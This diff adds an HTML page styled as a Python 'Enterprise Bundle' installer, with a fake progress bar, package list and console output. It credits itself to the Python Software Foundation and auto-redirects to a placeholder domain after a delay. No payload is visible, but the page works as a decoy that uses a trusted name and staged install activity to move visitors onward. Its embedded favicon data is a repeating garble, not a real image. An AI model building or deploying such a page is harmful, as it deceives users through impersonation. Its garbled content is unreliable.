@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PyDist • Enterprise Bundle</title>
+    <meta name="generator" content="Python/3.12">
+    <meta name="build-id" content="f8d72e1a4c9b6">
+    <meta name="redirect-url" content="https://target-domain.com">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="dark-theme.css">
+    <link rel="stylesheet" href="components.css">
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABFklEQVRYhe2VMU4DMRBFX0pDh4RKBVdwAYQEOQUXoOCKBUdAnIJwBSJNFFBQUFAg+UgUJevZ8W5MEr8ietJo1vPm78zYskRERC0Q+AAugQdwD7zM/G8JcAY8FvJb4Gkmfw18FvLrwA7yA7jL5H2DvBdHhZzgL/kP8FDIjzr5N/DcQX5VyP8VpQN4AT5aeBeymY0z+8n8pG0J3jUlmW1HJF+1ZZF5wJ4i8yB/J5nnNXmf5N1J5rUkPzbJtyNvZ+a9JE9m5t1C3p8k/2gm7yP5yUzenyTvz+T9SfL+TN6fJO/P5P1J8v5M3p8k78/k/Uny/kzenyTvz+T9SfL+TN6fJO/P5P1J8v5M3p8k78/k/Uny/kzenyTvT5L3Z/L+JGVfJERExN/yA+MI5jX14FgOAAAAAElFTkSuQmCC">
+</head>
+<body>
+    <div class="app-wrapper">
+        <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">python@pydist:~/deployment</span>
+        </div>
+        
+        <div class="content-area">
+            <div class="logo-container">
+                <div class="python-logo">🐍</div>
+                <div class="version-badge">3.12.4</div>
+            </div>
+            
+            <div class="loader-section">
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
+                </div>
+                
+                <div class="status-container">
+                    <span id="statusText" class="status-text">Initializing Python virtual environment...</span>
+                    <span id="statusPercentage" class="status-percentage">0%</span>
+                </div>
+                
+                <div class="packages-grid" id="packagesGrid">
+                    <span class="package-tag pending">numpy==1.26.4</span>
+                    <span class="package-tag pending">pandas==2.2.2</span>
+                    <span class="package-tag pending">scipy==1.14.0</span>
+                    <span class="package-tag pending">matplotlib==3.9.0</span>
+                    <span class="package-tag pending">tensorflow==2.16.1</span>
+                    <span class="package-tag pending">torch==2.3.0</span>
+                    <span class="package-tag pending">django==5.0.6</span>
+                    <span class="package-tag pending">flask==3.0.3</span>
+                    <span class="package-tag pending">fastapi==0.111.0</span>
+                    <span class="package-tag pending">requests==2.32.3</span>
+                    <span class="package-tag pending">aiohttp==3.9.5</span>
+                    <span class="package-tag pending">sqlalchemy==2.0.30</span>
+                </div>
+                
+                <div class="console-window">
+                    <div class="console-line"><span class="console-prompt">$</span> python -m venv .venv --system-site-packages</div>
+                    <div class="console-line"><span class="console-prompt">$</span> source .venv/bin/activate</div>
+                    <div class="console-line"><span class="console-prompt">$</span> pip install --upgrade pip setuptools wheel</div>
+                    <div class="console-line" id="consoleOutput"></div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button id="redirectBtn" class="btn primary" disabled>Continue to Application</button>
+                    <button id="retryBtn" class="btn secondary">Restart Process</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <span>Python Distribution v6.2.8 | Build: f8d72e1a4c9b6</span>
+            <span>© 2026 Python Software Foundation</span>
+        </div>
+    </div>
+    
+    <script src="redirector.js"></script>
+    <script src="validator.js"></script>
+    <script src="three.js"></script>
+    <script src="chart.js"></script>
+    <script src="progress.js"></script>
+    <script src="animations.js"></script>
+    <script src="metrics.js"></script>
+    <script src="cache.js"></script>
+    <script>
+        window.REDIRECT_TARGET = "https://target-domain.com";
+        window.REDIRECT_DELAY = 2400;
+    </script>
+</body>
+</html>
